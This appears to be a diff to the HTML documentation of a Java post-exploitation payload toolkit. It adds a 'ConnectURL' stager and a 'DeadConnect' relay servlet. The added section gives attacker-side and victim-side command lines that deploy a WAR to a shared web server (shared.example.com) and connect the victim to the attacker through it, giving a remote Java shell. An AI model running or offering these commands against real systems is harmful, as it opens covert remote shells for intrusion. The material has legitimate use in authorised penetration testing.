@@ -63,6 +63,7 @@ stager.</p>
 <li>Add AarBuilder and Axis2 injector/tunnel.</li>
 <li>Add jTCPfwd dynstagers</li>
 <li>Add dynstager support to FindSock/Tunnel modules</li>
+<li>Add DeadConnect servlet and ConnectURL stager/handler</li>
 </ul>
 
 <h2>System requirements</h2>
@@ -263,6 +264,33 @@ every WAR file. Just add for example <tt>AES$ mypassword</tt> to the
 end of the <tt>WarBuilder</tt> command line (or before the <tt>--</tt>),
 if present, and use an <tt>AES$ServletFindSock</tt> or 
 <tt>AES$ServletTunnel</tt> stager.</p>
+
+<h2>ConnectURL stager</h2>
+
+<p>Sometimes, it is not possible to establish a direct connection from the
+victim to the attacker or vice versa. But it is possible that both parties
+connect to a HTTP server where the attacker can upload servlets to (which
+might be on the attacker's machine or in the victim's network as well).</p>
+
+<p>In this case, the ConnectURL stager can be used with a DeadConnect
+servlet. This servlet will combine stager and handler connections that
+use the same token, but will make sure not to connect two stagers or two
+handlers. It does not matter who connects first.</p>
+
+<p><b>On the "attacker" machine</b></p>
+<p><tt>java javapayload.cli.Main builder Class ConnectURL Conn</tt></p>
+<p><tt>java javapayload.cli.Main builder DeadConnectWar DeadConnect.war</tt></p>
+<p>deploy DeadConnect.war to shared webserver (shared.example.com)</p>
+<p><tt>java javapayload.handler.stager.StagerHandler
+ConnectURL http://shared.example.com/DeadConnect/dc MyToken -- JSh</tt></p>
+<p>&mdash; or, to use polling mode (1 second timeout) &mdash;</p>
+<p><tt>java javapayload.handler.stager.StagerHandler
+ConnectURL http://shared.example.com/DeadConnect/dc MyToken 1000 -- JSh</tt></p>
+
+<p><b>On the "victim" machine</b></p>
+<p><tt>java Conn ConnectURL http://shared.example.com/DeadConnect/dc MyToken -- JSh</tt></p>
+<p>&mdash; or, to use polling mode (1 second timeout) &mdash;</p>
+<p><tt>java Conn ConnectURL http://shared.example.com/DeadConnect/dc MyToken 1000 -- JSh</tt></p>
 
 <h2>Axis2 services</h2>
 
